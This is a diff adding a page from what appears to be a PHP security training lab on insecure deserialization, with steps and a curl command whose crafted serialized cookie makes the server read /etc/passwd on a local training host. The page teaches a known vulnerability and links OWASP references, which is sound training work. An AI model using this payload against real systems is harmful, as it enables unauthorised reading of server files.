@@ -1,0 +1,28 @@
+<div class="body_padded">
+	<h1><nobr>Vulnerability: Insecure Deserialization</nobr></h1>
+	<p>(Look in the vulnerabilities folder under: <b>idsz</b>)</p>
+	<h2>Activity:</h2>
+    <ol>
+        <li>The first time you load this page, you should see "Welcome back FRED".</li>
+        <li>Open the browser tools and select <code>Network</code></li>
+        <li>Refresh the page.</li>
+        <li>From the browser tool, click on the original request <code>index.php?action=idsz</code>.  Note that a cookie is sent.</li>
+        <li>Still in the browser tools, looking at the original request, click on the button <b>Edit and Resend</b>.</li>
+        <li>Go down to the cookie, and make note of the PHP session ID</li>
+        <li>Open a terminal window and enter this cURL command, replacing <code>CURRENT</code> with the PHP session ID noted above.
+        IMPORTANT: this command should be all on one line.  The backslash (\) is used to make the output more clear:
+        <pre>curl -v --cookie "PHPSESSID=CURRENT; \
+    user=O%3A4%3A%22User%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A11%3A%22%2Fetc%2Fpasswd%22%3Bs%3A11%3A%22%00%2A%00strategy%22%3Bs%3A17%3A%22file_get_contents%22%3B%7D" http://securitytraining.phpsecurity.local/index.php?action=idsz</pre>
+        </li>
+        <li>You should now see the contents of <code>/etc/passwd</code></li>
+    </ol>
+	<div class="vulnerable_code_area">
+		<?= $this->html?>
+	</div>
+
+	<h2>Reference:</h2>
+	<ul>
+		<li><a href="https://www.owasp.org/index.php/PHP_Object_Injection" target="_blank">PHP Object Injection</a></li>
+		<li><a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md" target="_blank">OWASP Deserialization Cheat Sheet</a></li>
+	</ul>
+</div>
